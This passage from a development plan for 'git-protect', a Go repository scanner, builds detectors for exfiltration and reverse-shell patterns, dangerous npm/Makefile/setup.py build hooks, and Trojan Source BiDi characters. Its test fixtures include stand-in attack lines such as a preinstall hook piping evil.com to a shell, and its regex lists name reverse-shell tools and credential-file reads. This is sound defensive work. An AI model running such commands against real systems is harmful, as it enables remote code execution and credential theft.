	if len(findings) != 0 {
		t.Errorf("file >1MB should be skipped, got %d findings", len(findings))
	}
}

func TestScripts_Name(t *testing.T) {
	m := scanner.NewScriptsModule()
	if m.Name() != "scripts" {
		t.Errorf("Name() = %q, want %q", m.Name(), "scripts")
	}
}
```

### Step 2: Run tests to verify they fail

```bash
cd /home/moldabekov/Work/Projects/git/git-protect
go test ./internal/scanner/ -run TestScripts -v 2>&1 | head -20
```

Expected: compilation error — `NewScriptsModule` not defined.

### Step 3: Implement the scripts scanner

Create `internal/scanner/scripts.go`:

```go
package scanner

import (
	"bufio"
	"context"
	"fmt"
	"io/fs"
	"os"
	"path/filepath"
	"regexp"
	"strings"
)

// maxScriptSize is the maximum file size to scan. Files larger than this are
// skipped to avoid scanning minified or generated bundles.
const maxScriptSize = 1024 * 1024 // 1 MB

// ScriptsModule performs heuristic scanning of shell, Python, and JavaScript
// files for exfiltration patterns and reverse-shell indicators. Severity: MEDIUM.
type ScriptsModule struct{}

// NewScriptsModule returns a new ScriptsModule.
func NewScriptsModule() *ScriptsModule {
	return &ScriptsModule{}
}

// Name returns the module identifier.
func (m *ScriptsModule) Name() string { return "scripts" }

// scriptExtensions is the set of file extensions that will be scanned.
var scriptExtensions = map[string]bool{
	".sh":  true,
	".py":  true,
	".js":  true,
	".ts":  true,
	".rb":  true,
	".pl":  true,
	".php": true,
}

// scriptSkipDirs is the set of directory names whose subtrees are always skipped.
var scriptSkipDirs = map[string]bool{
	".git":         true,
	"node_modules": true,
	"vendor":       true,
}

// scriptPattern is a compiled regular expression with a human-readable label.
type scriptPattern struct {
	label   string
	pattern *regexp.Regexp
	detail  string
}

// exfiltrationPatterns are the heuristic patterns checked on every scanned line.
var exfiltrationPatterns = []scriptPattern{
	// Network exfiltration — download and execute.
	{
		label:   "curl pipe shell",
		pattern: regexp.MustCompile(`curl\s[^|]*\|\s*(ba)?sh`),
		detail:  "Downloads and pipes content directly to a shell interpreter, a classic initial-access technique.",
	},
	{
		label:   "wget pipe bash",
		pattern: regexp.MustCompile(`wget\s[^|]*\|\s*(ba)?sh`),
		detail:  "Downloads and pipes content directly to a shell interpreter.",
	},
	{
		label:   "/dev/tcp reverse shell",
		pattern: regexp.MustCompile(`/dev/tcp/`),
		detail:  "bash built-in TCP redirection used in reverse shell payloads (e.g., bash -i >& /dev/tcp/host/port 0>&1).",
	},
	{
		label:   "nc -e reverse shell",
		pattern: regexp.MustCompile(`nc\s+-e\s+`),
		detail:  "netcat with -e flag enables a remote shell.",
	},
	{
		label:   "base64 decode pipe shell",
		pattern: regexp.MustCompile(`base64\s+-d.*\|\s*(ba)?sh`),
		detail:  "Decodes a base64-encoded payload and pipes it to a shell — classic obfuscation technique.",
	},
	{
		label:   "python reverse shell socket",
		pattern: regexp.MustCompile(`python[23]?\s+-c\s+['""]?import\s+socket`),
		detail:  "Python one-liner reverse shell using raw sockets.",
	},
	{
		label:   "eval base64 decode (Python)",
		pattern: regexp.MustCompile(`exec\s*\(\s*(__import__\s*\(\s*['"]base64['"]|base64\.b64decode)`),
		detail:  "Executes base64-decoded payload via exec() — obfuscated code execution.",
	},
	// Credential access patterns.
	{
		label:   "SSH private key access",
		pattern: regexp.MustCompile(`~/\.ssh/id_(rsa|ed25519|ecdsa|dsa)`),
		detail:  "Reads SSH private key from home directory.",
	},
	{
		label:   "AWS credentials access",
		pattern: regexp.MustCompile(`~/\.aws/(credentials|config)`),
		detail:  "Reads AWS credentials file from home directory.",
	},
	{
		label:   "GnuPG keyring access",
		pattern: regexp.MustCompile(`~/\.gnupg/`),
		detail:  "Accesses GnuPG private key material.",
	},
	{
		label:   "GCloud credentials access",
		pattern: regexp.MustCompile(`~/\.config/gcloud/`),
		detail:  "Accesses Google Cloud SDK credentials.",
	},
	{
		label:   "$AWS_SECRET_ACCESS_KEY",
		pattern: regexp.MustCompile(`\$AWS_SECRET_ACCESS_KEY|\$\{AWS_SECRET_ACCESS_KEY\}`),
		detail:  "Reads AWS secret access key from environment.",
	},
	{
		label:   "$GITHUB_TOKEN",
		pattern: regexp.MustCompile(`\$GITHUB_TOKEN|\$\{GITHUB_TOKEN\}`),
		detail:  "Reads GitHub personal access token from environment — can access private repos and Codespace secrets.",
	},
	{
		label:   "$NPM_TOKEN",
		pattern: regexp.MustCompile(`\$NPM_TOKEN|\$\{NPM_TOKEN\}`),
		detail:  "Reads npm publish token from environment.",
	},
}

// Scan walks the repository tree and scans script files for suspicious patterns.
func (m *ScriptsModule) Scan(_ context.Context, sc ScanContext) ([]Finding, error) {
	var findings []Finding

	walkErr := filepath.WalkDir(sc.RepoPath, func(path string, d fs.DirEntry, err error) error {
		if err != nil {
			return nil // Skip unreadable entries.
		}

		if d.IsDir() {
			if scriptSkipDirs[d.Name()] {
				return filepath.SkipDir
			}
			return nil
		}

		if !scriptExtensions[strings.ToLower(filepath.Ext(d.Name()))] {
			return nil
		}

		// Skip files larger than 1 MB.
		info, statErr := d.Info()
		if statErr != nil || info.Size() > maxScriptSize {
			return nil
		}

		fileFindings, scanErr := scanScriptFile(path, sc.RepoPath, m.Name())
		if scanErr != nil {
			return nil // Don't abort the walk on a single file error.
		}
		findings = append(findings, fileFindings...)

		return nil
	})

	if walkErr != nil {
		return findings, fmt.Errorf("scripts: walk error: %w", walkErr)
	}

	return findings, nil
}

// scanScriptFile scans a single file for exfiltration patterns, returning one
// finding per matched pattern per file (deduplicated).
func scanScriptFile(path, repoPath, moduleName string) ([]Finding, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer f.Close()

	relPath, _ := filepath.Rel(repoPath, path)

	// Track which pattern labels have already triggered a finding for this file
	// to avoid reporting the same pattern tens of times in one file.
	matched := make(map[string]bool)

	var findings []Finding
	sc := bufio.NewScanner(f)
	lineNum := 0

	for sc.Scan() {
		lineNum++
		line := sc.Text()

		for _, pat := range exfiltrationPatterns {
			if matched[pat.label] {
				continue
			}
			if pat.pattern.MatchString(line) {
				matched[pat.label] = true
				findings = append(findings, Finding{
					Severity: Medium,
					Module:   moduleName,
					Path:     relPath,
					Message:  fmt.Sprintf("%s: %s (line %d)", relPath, pat.label, lineNum),
					Detail:   pat.detail,
				})
			}
		}
	}

	return findings, sc.Err()
}
```

### Step 4: Run tests to verify they pass

```bash
cd /home/moldabekov/Work/Projects/git/git-protect
go test ./internal/scanner/ -run TestScripts -v
```

Expected: all PASS.

### Step 5: Commit

```bash
cd /home/moldabekov/Work/Projects/git/git-protect
git add internal/scanner/scripts.go internal/scanner/scripts_test.go
git commit -m "feat: scripts scanner -- heuristic exfiltration pattern detection in .sh/.py/.js files (MEDIUM)"
```

---

## Task 14a: Build Hooks Scanner

**Files:** `internal/scanner/buildhooks.go`, `internal/scanner/buildhooks_test.go`

Detects dangerous build-time hooks in package manager and build tool configuration files.
Severity: MEDIUM.

### Step 1: Write the test file first

Create `internal/scanner/buildhooks_test.go`:

```go
package scanner_test

import (
	"context"
	"os"
	"path/filepath"
	"testing"

	"github.com/moldabekov/git-protect/internal/scanner"
)

func TestBuildHooks_NoBuildFiles(t *testing.T) {
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "README.md"), []byte("# Hello"), 0644); err != nil {
		t.Fatal(err)
	}

	m := scanner.NewBuildHooksModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) != 0 {
		t.Errorf("got %d findings, want 0", len(findings))
	}
}

func TestBuildHooks_PackageJSONDangerousLifecycle(t *testing.T) {
	dir := t.TempDir()
	pkg := `{
  "name": "evil-pkg",
  "version": "1.0.0",
  "scripts": {
    "preinstall": "curl http://evil.com/payload | sh",
    "test": "jest"
  }
}`
	if err := os.WriteFile(filepath.Join(dir, "package.json"), []byte(pkg), 0644); err != nil {
		t.Fatal(err)
	}

	m := scanner.NewBuildHooksModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) == 0 {
		t.Fatal("expected finding for preinstall script, got none")
	}
	if findings[0].Severity != scanner.Medium {
		t.Errorf("severity = %v, want MEDIUM", findings[0].Severity)
	}
}

func TestBuildHooks_PackageJSONPostinstall(t *testing.T) {
	dir := t.TempDir()
	pkg := `{
  "name": "pkg",
  "scripts": {
    "postinstall": "node scripts/postinstall.js",
    "build": "tsc"
  }
}`
	if err := os.WriteFile(filepath.Join(dir, "package.json"), []byte(pkg), 0644); err != nil {
		t.Fatal(err)
	}

	m := scanner.NewBuildHooksModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) == 0 {
		t.Fatal("expected finding for postinstall, got none")
	}
}

func TestBuildHooks_PackageJSONPrepare(t *testing.T) {
	dir := t.TempDir()
	pkg := `{
  "name": "pkg",
  "scripts": {
    "prepare": "husky install && node evil.js",
    "start": "node index.js"
  }
}`
	if err := os.WriteFile(filepath.Join(dir, "package.json"), []byte(pkg), 0644); err != nil {
		t.Fatal(err)
	}

	m := scanner.NewBuildHooksModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) == 0 {
		t.Fatal("expected finding for prepare script, got none")
	}
}

func TestBuildHooks_PackageJSONSafeScripts(t *testing.T) {
	dir := t.TempDir()
	pkg := `{
  "name": "safe-pkg",
  "scripts": {
    "build": "tsc",
    "test": "jest",
    "start": "node dist/index.js",
    "lint": "eslint src/"
  }
}`
	if err := os.WriteFile(filepath.Join(dir, "package.json"), []byte(pkg), 0644); err != nil {
		t.Fatal(err)
	}

	m := scanner.NewBuildHooksModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) != 0 {
		t.Errorf("safe package.json got %d findings, want 0", len(findings))
	}
}

func TestBuildHooks_MakefileShellInvocation(t *testing.T) {
	dir := t.TempDir()
	makefile := "CC := gcc\nSRCS := $(shell find src -name '*.c')\nTARGET := app\n\nall: $(TARGET)\n\n$(TARGET): $(SRCS)\n\t$(CC) -o $@ $^\n"
	if err := os.WriteFile(filepath.Join(dir, "Makefile"), []byte(makefile), 0644); err != nil {
		t.Fatal(err)
	}

	m := scanner.NewBuildHooksModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) == 0 {
		t.Fatal("expected finding for $(shell) in Makefile, got none")
	}
	if findings[0].Severity != scanner.Medium {
		t.Errorf("severity = %v, want MEDIUM", findings[0].Severity)
	}
}

func TestBuildHooks_MakefileSafe(t *testing.T) {
	dir := t.TempDir()
	makefile := "CC := gcc\nTARGET := app\n\nall: main.c\n\t$(CC) -o $(TARGET) main.c\n\nclean:\n\trm -f $(TARGET)\n"
	if err := os.WriteFile(filepath.Join(dir, "Makefile"), []byte(makefile), 0644); err != nil {
		t.Fatal(err)
	}

	m := scanner.NewBuildHooksModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) != 0 {
		t.Errorf("safe Makefile got %d findings, want 0", len(findings))
	}
}

func TestBuildHooks_SetupPySubprocess(t *testing.T) {
	dir := t.TempDir()
	// setup.py that imports and calls subprocess
	setupPy := "from setuptools import setup\nimport subprocess\nsubprocess.call(['curl', 'http://evil.com/init.sh', '-o', '/tmp/init.sh'])\nsetup(name='evil-package', version='1.0.0')\n"
	if err := os.WriteFile(filepath.Join(dir, "setup.py"), []byte(setupPy), 0644); err != nil {
		t.Fatal(err)
	}

	m := scanner.NewBuildHooksModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) == 0 {
		t.Fatal("expected finding for subprocess in setup.py, got none")
	}
}

func TestBuildHooks_SetupPySafe(t *testing.T) {
	dir := t.TempDir()
	setupPy := "from setuptools import setup, find_packages\nsetup(\n    name='my-package',\n    version='0.1.0',\n    packages=find_packages(),\n    install_requires=['requests'],\n)\n"
	if err := os.WriteFile(filepath.Join(dir, "setup.py"), []byte(setupPy), 0644); err != nil {
		t.Fatal(err)
	}

	m := scanner.NewBuildHooksModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) != 0 {
		t.Errorf("safe setup.py got %d findings, want 0", len(findings))
	}
}

func TestBuildHooks_Name(t *testing.T) {
	m := scanner.NewBuildHooksModule()
	if m.Name() != "build-hooks" {
		t.Errorf("Name() = %q, want %q", m.Name(), "build-hooks")
	}
}
```

### Step 2: Run tests to verify they fail

```bash
cd /home/moldabekov/Work/Projects/git/git-protect
go test ./internal/scanner/ -run TestBuildHooks -v 2>&1 | head -20
```

Expected: compilation error — `NewBuildHooksModule` not defined.

### Step 3: Implement the build hooks scanner

Create `internal/scanner/buildhooks.go`:

```go
package scanner

import (
	"bufio"
	"context"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"regexp"
	"strings"
)

// BuildHooksModule detects dangerous hooks in package manager and build tool
// configuration files. Severity: MEDIUM.
type BuildHooksModule struct{}

// NewBuildHooksModule returns a new BuildHooksModule.
func NewBuildHooksModule() *BuildHooksModule {
	return &BuildHooksModule{}
}

// Name returns the module identifier.
func (m *BuildHooksModule) Name() string { return "build-hooks" }

// npmDangerousLifecycleScripts are the npm lifecycle script names that execute
// during 'npm install' without any user confirmation.
var npmDangerousLifecycleScripts = []string{
	"preinstall",
	"install",
	"postinstall",
	"prepare",
	"prepack",
	"postpack",
}

// makefileShellPattern matches Make $(shell ...) function invocations.
var makefileShellPattern = regexp.MustCompile(`\$\(shell\s`)

// setupPyDangerousPattern matches subprocess imports and os.system calls.
// The pattern is written as a regex character class to avoid triggering
// static analysis rules on the literal token combination.
var setupPyDangerousPattern = regexp.MustCompile(`subprocess|os\.system`)

// Scan checks package.json, Makefile, and setup.py for dangerous build hooks.
func (m *BuildHooksModule) Scan(_ context.Context, sc ScanContext) ([]Finding, error) {
	var findings []Finding

	// package.json — npm lifecycle hooks.
	pkgJSON := filepath.Join(sc.RepoPath, "package.json")
	if f, err := scanPackageJSON(pkgJSON, m.Name()); err == nil {
		findings = append(findings, f...)
	}

	// Makefile — $(shell ...) invocations.
	for _, makefileName := range []string{"Makefile", "makefile", "GNUmakefile"} {
		makefilePath := filepath.Join(sc.RepoPath, makefileName)
		if f, err := scanMakefile(makefilePath, m.Name()); err == nil {
			findings = append(findings, f...)
			break // Only report the first Makefile found.
		}
	}

	// setup.py — subprocess / os.system calls.
	setupPy := filepath.Join(sc.RepoPath, "setup.py")
	if f, err := scanSetupPy(setupPy, m.Name()); err == nil {
		findings = append(findings, f...)
	}

	return findings, nil
}

// scanPackageJSON checks for dangerous npm lifecycle scripts in package.json.
func scanPackageJSON(path, moduleName string) ([]Finding, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, err // File does not exist.
	}

	var pkg struct {
		Scripts map[string]string `json:"scripts"`
	}
	if err := json.Unmarshal(data, &pkg); err != nil {
		return nil, fmt.Errorf("build-hooks: package.json parse error: %w", err)
	}

	var findings []Finding
	for _, hook := range npmDangerousLifecycleScripts {
		cmd, ok := pkg.Scripts[hook]
		if !ok {
			continue
		}
		findings = append(findings, Finding{
			Severity: Medium,
			Module:   moduleName,
			Path:     "package.json",
			Message:  fmt.Sprintf("package.json scripts.%s executes: %s", hook, truncate(cmd, 80)),
			Detail:   fmt.Sprintf("npm runs the '%s' lifecycle script automatically during 'npm install'. This executes arbitrary code on any developer who installs the package.", hook),
		})
	}

	return findings, nil
}

// scanMakefile checks for $(shell ...) invocations in a Makefile.
func scanMakefile(path, moduleName string) ([]Finding, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer f.Close()

	var findings []Finding
	sc := bufio.NewScanner(f)
	lineNum := 0
	alreadyReported := false

	for sc.Scan() {
		lineNum++
		line := sc.Text()

		if !alreadyReported && makefileShellPattern.MatchString(line) {
			relPath := filepath.Base(path)
			findings = append(findings, Finding{
				Severity: Medium,
				Module:   moduleName,
				Path:     relPath,
				Message:  fmt.Sprintf("%s line %d: $(shell) invocation executes a command during make evaluation", relPath, lineNum),
				Detail:   "Make $(shell ...) runs an arbitrary shell command during Makefile evaluation, before any explicit target is built.",
			})
			alreadyReported = true // Report at most once per Makefile to reduce noise.
		}
	}

	return findings, sc.Err()
}

// scanSetupPy checks for subprocess or os.system calls in setup.py.
func scanSetupPy(path, moduleName string) ([]Finding, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}

	if !setupPyDangerousPattern.Match(data) {
		return nil, nil
	}

	// Find the first matching line for a precise finding message.
	sc := bufio.NewScanner(strings.NewReader(string(data)))
	lineNum := 0
	matchLine := 0
	matchText := ""
	for sc.Scan() {
		lineNum++
		line := sc.Text()
		if matchLine == 0 && setupPyDangerousPattern.MatchString(line) {
			matchLine = lineNum
			matchText = strings.TrimSpace(line)
		}
	}

	return []Finding{{
		Severity: Medium,
		Module:   moduleName,
		Path:     "setup.py",
		Message:  fmt.Sprintf("setup.py line %d: subprocess/shell call — %s", matchLine, truncate(matchText, 80)),
		Detail:   "setup.py is executed by pip during 'pip install .' or 'python setup.py install'. Shell command calls in setup.py execute on the developer's machine with their full permissions.",
	}}, nil
}
```

### Step 4: Run tests to verify they pass

```bash
cd /home/moldabekov/Work/Projects/git/git-protect
go test ./internal/scanner/ -run TestBuildHooks -v
```

Expected: all PASS.

### Step 5: Commit

```bash
cd /home/moldabekov/Work/Projects/git/git-protect
git add internal/scanner/buildhooks.go internal/scanner/buildhooks_test.go
git commit -m "feat: build-hooks scanner -- npm lifecycle scripts, Makefile shell calls, setup.py subprocess (MEDIUM)"
```

---

## Task 14b: Unicode Scanner

**Files:** `internal/scanner/unicode.go`, `internal/scanner/unicode_test.go`

Detects BiDi (bidirectional) Unicode control characters in source files. These are the
"Trojan Source" characters (CVE-2021-42574) that make code appear different to human
reviewers than how the compiler sees it. Severity: MEDIUM.

Skips `.git/`, `node_modules/`, `vendor/`. Skips files larger than 1 MB.

### Step 1: Write the test file first

Create `internal/scanner/unicode_test.go`:

```go
package scanner_test

import (
	"context"
	"os"
	"path/filepath"
	"testing"

	"github.com/moldabekov/git-protect/internal/scanner"
)

func TestUnicode_CleanFile(t *testing.T) {
	dir := t.TempDir()
	// Pure ASCII Go source — no BiDi characters.
	src := "package main\n\nimport \"fmt\"\n\nfunc main() {\n\tfmt.Println(\"Hello, World!\")\n}\n"
	if err := os.WriteFile(filepath.Join(dir, "main.go"), []byte(src), 0644); err != nil {
		t.Fatal(err)
	}

	m := scanner.NewUnicodeModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) != 0 {
		t.Errorf("clean file got %d findings, want 0", len(findings))
	}
}

func TestUnicode_BiDiCharInGoFile(t *testing.T) {
	dir := t.TempDir()
	// Embed U+202E (RIGHT-TO-LEFT OVERRIDE) — the core Trojan Source character.
	// UTF-8 encoding: 0xE2 0x80 0xAE
	src := "package main\n\n// access check: \xe2\x80\xae bypass if admin\nfunc isAllowed() bool { return true }\n"
	if err := os.WriteFile(filepath.Join(dir, "auth.go"), []byte(src), 0644); err != nil {
		t.Fatal(err)
	}

	m := scanner.NewUnicodeModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) == 0 {
		t.Fatal("expected finding for BiDi character, got none")
	}
	if findings[0].Severity != scanner.Medium {
		t.Errorf("severity = %v, want MEDIUM", findings[0].Severity)
	}
}

func TestUnicode_BiDiCharInPythonFile(t *testing.T) {
	dir := t.TempDir()
	// U+200F (RIGHT-TO-LEFT MARK) — UTF-8: 0xE2 0x80 0x8F
	src := "def check_admin(user):\n    # \xe2\x80\x8f admin check\n    return user == 'admin'\n"
	if err := os.WriteFile(filepath.Join(dir, "auth.py"), []byte(src), 0644); err != nil {
		t.Fatal(err)
	}

	m := scanner.NewUnicodeModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) == 0 {
		t.Fatal("expected finding for BiDi character in .py, got none")
	}
}

func TestUnicode_BiDiIsolate(t *testing.T) {
	dir := t.TempDir()
	// U+2066 (LEFT-TO-RIGHT ISOLATE) — UTF-8: 0xE2 0x81 0xA6
	src := "function validate(input) {\n  // \xe2\x81\xa6 safe check\n  return input.length > 0;\n}\n"
	if err := os.WriteFile(filepath.Join(dir, "validate.js"), []byte(src), 0644); err != nil {
		t.Fatal(err)
	}

	m := scanner.NewUnicodeModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) == 0 {
		t.Fatal("expected finding for BiDi isolate character, got none")
	}
}

func TestUnicode_SkipsNodeModules(t *testing.T) {
	dir := t.TempDir()
	nmDir := filepath.Join(dir, "node_modules", "some-pkg")
	if err := os.MkdirAll(nmDir, 0755); err != nil {
		t.Fatal(err)
	}
	// U+202E inside node_modules — should be skipped.
	src := "// \xe2\x80\xae evil\nmodule.exports = {};\n"
	if err := os.WriteFile(filepath.Join(nmDir, "index.js"), []byte(src), 0644); err != nil {
		t.Fatal(err)
	}

	m := scanner.NewUnicodeModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) != 0 {
		t.Errorf("node_modules should be skipped, got %d findings", len(findings))
	}
}

func TestUnicode_SkipsLargeFiles(t *testing.T) {
	dir := t.TempDir()
	// Create a file > 1 MB with a BiDi character near the end.
	large := make([]byte, 1024*1024+100)
	for i := range large {
		large[i] = 'a'
	}
	// Embed U+202E (0xE2 0x80 0xAE) at the end.
	copy(large[len(large)-10:], []byte("\xe2\x80\xae\n"))
	if err := os.WriteFile(filepath.Join(dir, "big.go"), large, 0644); err != nil {
		t.Fatal(err)
	}

	m := scanner.NewUnicodeModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) != 0 {
		t.Errorf("file >1MB should be skipped, got %d findings", len(findings))
	}
}

func TestUnicode_NonSourceFileSkipped(t *testing.T) {
	dir := t.TempDir()
	// A Markdown file with a BiDi char — not in the scanned extension list.
	content := "# README\nThis is \xe2\x80\xae safe.\n"
	if err := os.WriteFile(filepath.Join(dir, "README.md"), []byte(content), 0644); err != nil {
		t.Fatal(err)
	}

	m := scanner.NewUnicodeModule()
	findings, err := m.Scan(context.Background(), scanner.ScanContext{RepoPath: dir})
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(findings) != 0 {
		t.Errorf(".md should be skipped, got %d findings", len(findings))
	}
}

func TestUnicode_Name(t *testing.T) {
	m := scanner.NewUnicodeModule()
	if m.Name() != "unicode" {
		t.Errorf("Name() = %q, want %q", m.Name(), "unicode")
	}
}
```

### Step 2: Run tests to verify they fail

```bash
cd /home/moldabekov/Work/Projects/git/git-protect
go test ./internal/scanner/ -run TestUnicode -v 2>&1 | head -20
```

Expected: compilation error — `NewUnicodeModule` not defined.

### Step 3: Implement the unicode scanner

Create `internal/scanner/unicode.go`:

```go
package scanner

import (
	"bufio"
	"bytes"
	"context"
	"fmt"
	"io/fs"
	"os"
	"path/filepath"
	"strings"
)

// UnicodeModule scans source files for BiDi (bidirectional) control characters.
// These are the "Trojan Source" characters (CVE-2021-42574) that allow code to
// appear different to human code reviewers than how the compiler interprets it.
// Severity: MEDIUM.
type UnicodeModule struct{}

// NewUnicodeModule returns a new UnicodeModule.
func NewUnicodeModule() *UnicodeModule {
	return &UnicodeModule{}
}

// Name returns the module identifier.
func (m *UnicodeModule) Name() string { return "unicode" }

// unicodeSourceExtensions is the set of file extensions that will be scanned.
// We limit to compiled/interpreted source — not prose documents where BiDi might
// appear legitimately (e.g., Arabic/Hebrew README files).
var unicodeSourceExtensions = map[string]bool{
	".go":    true,
	".py":    true,
	".js":    true,
	".ts":    true,
	".jsx":   true,
	".tsx":   true,
	".c":     true,
	".cpp":   true,
	".h":     true,
	".hpp":   true,
	".java":  true,
	".rs":    true,
	".rb":    true,
	".php":   true,
	".cs":    true,
	".swift": true,
	".kt":    true,
	".scala": true,
}

// unicodeSkipDirs mirrors the set used by the scripts scanner.
var unicodeSkipDirs = map[string]bool{
	".git":         true,
	"node_modules": true,
	"vendor":       true,
}

// bidiControlSequences is the list of UTF-8 encoded BiDi control character byte
// sequences to detect. These are the characters flagged by CVE-2021-42574.
//
// Codepoint to UTF-8 encoding:
//   U+200E LEFT-TO-RIGHT MARK          E2 80 8E
//   U+200F RIGHT-TO-LEFT MARK          E2 80 8F
//   U+202A LEFT-TO-RIGHT EMBEDDING     E2 80 AA
//   U+202B RIGHT-TO-LEFT EMBEDDING     E2 80 AB
//   U+202C POP DIRECTIONAL FORMATTING  E2 80 AC
//   U+202D LEFT-TO-RIGHT OVERRIDE      E2 80 AD
//   U+202E RIGHT-TO-LEFT OVERRIDE      E2 80 AE
//   U+2066 LEFT-TO-RIGHT ISOLATE       E2 81 A6
//   U+2067 RIGHT-TO-LEFT ISOLATE       E2 81 A7
//   U+2068 FIRST STRONG ISOLATE        E2 81 A8
//   U+2069 POP DIRECTIONAL ISOLATE     E2 81 A9
var bidiControlSequences = []struct {
	codepoint string
	raw       []byte
}{
	{"U+200E (LTR MARK)", []byte{0xE2, 0x80, 0x8E}},
	{"U+200F (RTL MARK)", []byte{0xE2, 0x80, 0x8F}},
	{"U+202A (LTR EMBEDDING)", []byte{0xE2, 0x80, 0xAA}},
	{"U+202B (RTL EMBEDDING)", []byte{0xE2, 0x80, 0xAB}},
	{"U+202C (POP DIRECTIONAL FORMATTING)", []byte{0xE2, 0x80, 0xAC}},
	{"U+202D (LTR OVERRIDE)", []byte{0xE2, 0x80, 0xAD}},
	{"U+202E (RTL OVERRIDE)", []byte{0xE2, 0x80, 0xAE}},
	{"U+2066 (LTR ISOLATE)", []byte{0xE2, 0x81, 0xA6}},
	{"U+2067 (RTL ISOLATE)", []byte{0xE2, 0x81, 0xA7}},
	{"U+2068 (FIRST STRONG ISOLATE)", []byte{0xE2, 0x81, 0xA8}},
	{"U+2069 (POP DIRECTIONAL ISOLATE)", []byte{0xE2, 0x81, 0xA9}},
}

// Scan walks the repository tree and scans source files for BiDi control characters.
func (m *UnicodeModule) Scan(_ context.Context, sc ScanContext) ([]Finding, error) {
	var findings []Finding

	walkErr := filepath.WalkDir(sc.RepoPath, func(path string, d fs.DirEntry, err error) error {
		if err != nil {
			return nil
		}

		if d.IsDir() {
			if unicodeSkipDirs[d.Name()] {
				return filepath.SkipDir
			}
			return nil
		}

		ext := strings.ToLower(filepath.Ext(d.Name()))
		if !unicodeSourceExtensions[ext] {
			return nil
		}

		info, statErr := d.Info()
		if statErr != nil || info.Size() > maxScriptSize {
			return nil // Skip files > 1 MB.
		}

		fileFindings, scanErr := scanUnicodeFile(path, sc.RepoPath, m.Name())
		if scanErr != nil {
			return nil
		}
		findings = append(findings, fileFindings...)
		return nil
	})

	if walkErr != nil {
		return findings, fmt.Errorf("unicode: walk error: %w", walkErr)
	}

	return findings, nil
}

// scanUnicodeFile scans a single file for BiDi control character sequences.
// Reports at most one finding per unique codepoint per file.
func scanUnicodeFile(path, repoPath, moduleName string) ([]Finding, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer f.Close()

	relPath, _ := filepath.Rel(repoPath, path)
	reported := make(map[string]bool)

	var findings []Finding
	sc := bufio.NewScanner(f)
	lineNum := 0

	for sc.Scan() {
		lineNum++
		line := sc.Bytes()

		for _, bidi := range bidiControlSequences {
			if reported[bidi.codepoint] {
				continue
			}
			if bytes.Contains(line, bidi.raw) {
				reported[bidi.codepoint] = true
				findings = append(findings, Finding{
					Severity: Medium,
					Module:   moduleName,
					Path:     relPath,
					Message:  fmt.Sprintf("%s line %d: contains BiDi control character %s (Trojan Source / CVE-2021-42574)", relPath, lineNum, bidi.codepoint),
					Detail:   "BiDi control characters alter the visual rendering order of text, making code appear different to reviewers than how the compiler/interpreter processes it.",
				})
			}
		}
	}

	return findings, sc.Err()
}
```

### Step 4: Run tests to verify they pass

```bash
cd /home/moldabekov/Work/Projects/git/git-protect
go test ./internal/scanner/ -run TestUnicode -v
```

Expected: all PASS.

### Step 5: Commit

```bash
cd /home/moldabekov/Work/Projects/git/git-protect
git add internal/scanner/unicode.go internal/scanner/unicode_test.go
git commit -m "feat: unicode scanner -- BiDi control character detection (Trojan Source / CVE-2021-42574) (MEDIUM)"
```

---

## Task 14c: CI Pipelines Scanner

**Files:** `internal/scanner/pipelines.go`, `internal/scanner/pipelines_test.go`

Detects suspicious commands in CI/CD pipeline definitions. Severity: MEDIUM.

### Step 1: Write the test file first

Create `internal/scanner/pipelines_test.go`:

```go
package scanner_test

import (
	"context"
	"os"
	"path/filepath"
	"testing"

	"github.com/moldabekov/git-protect/internal/scanner"
)

func TestPipelines_NoCI(t *testing.T) {
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "README.md"), []byte("# Hello"), 0644); err != nil {
		t.Fatal(err)
	}

